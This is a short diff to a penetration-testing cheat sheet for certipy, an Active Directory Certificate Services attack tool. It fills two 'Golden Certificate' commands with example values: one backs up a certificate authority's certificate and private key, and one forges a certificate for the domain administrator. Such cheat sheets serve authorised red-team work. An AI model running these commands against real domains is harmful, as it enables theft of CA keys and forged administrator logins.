@@ -29,13 +29,13 @@ certipy auth -pfx <pfx-file> -dc-ip <dc-ip> -ldap-shell
 ## certipy - Golden Certificate - steal CA certificate and private key
 #plateform/linux #target/remote #cat/ATTACK
 ```
-certipy ca -u <user>@<domain> -p '<password>' -backup -ca <certificate-authority> -target-ip <ca-ip>
+certipy ca -u 'administrator@corp.local' -p 'Passw0rd!' -ns '10.10.10.10' -target 'CA.CORP.LOCAL' -config 'CA.CORP.LOCAL\CORP-CA' -backup
 ```
 
 ## certipy - Golden Certificate - forge certificate
 #plateform/linux #target/remote #cat/ATTACK
 ```
-certipy forge -ca-pfx <pfx-file> -upn <user>@<domain> -crl ldap://<dc-ip>:389
+certipy forge -ca-pfx 'CORP-CA.pfx' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' -crl 'ldap:///'
 ```
 
 ## certipy - request certificate for another user - ESC1 - ESC6
